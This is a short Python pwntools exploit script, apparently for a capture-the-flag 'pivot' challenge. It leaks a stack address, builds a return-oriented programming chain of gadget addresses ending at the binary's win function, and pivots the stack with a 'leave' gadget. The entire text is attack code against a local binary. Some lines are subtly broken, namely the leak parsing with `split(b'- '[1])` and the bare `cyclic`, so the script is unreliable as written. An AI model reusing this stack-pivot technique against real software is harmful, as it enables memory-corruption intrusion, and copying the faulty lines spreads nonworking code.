#!/usr/bin/python3

from pwn import * 

elf = context.binary = ELF('./pivot')

io  = process()
leak = int(io.recvline(keepends=False).split(b'- '[1]),16)
payload1 = pack(0) + pack(0x00000000004012b3) + pack(0Xbabecafe) + pack(0x00000000004012b1) + pack(0Xbabecafe) + pack(0) + pack(elf.sym.win)

                     # pop rdi
                                                                   #pop rsi 
payload = cyclic + pack(leak) + pack(0x0000000000401234)  # leave address

io.sendline(payload1)
io.sendline(payload)

io.interactive()
